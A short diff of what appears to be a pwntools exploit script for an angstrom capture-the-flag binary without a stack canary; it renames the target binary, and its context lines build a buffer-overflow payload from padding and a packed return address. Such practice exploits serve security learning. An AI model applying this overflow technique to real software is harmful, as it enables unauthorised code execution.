@@ -6,7 +6,7 @@ import time
 
 import sys
 
-target = process("./chall-test_localID-angstrum-no-canary")
+target = process("./chall-test_localLibcId-angstrum-no-canary")
 payload = ""
 payload += "0000000000000000000000000000000000000000"
 payload += p64(0x401343)
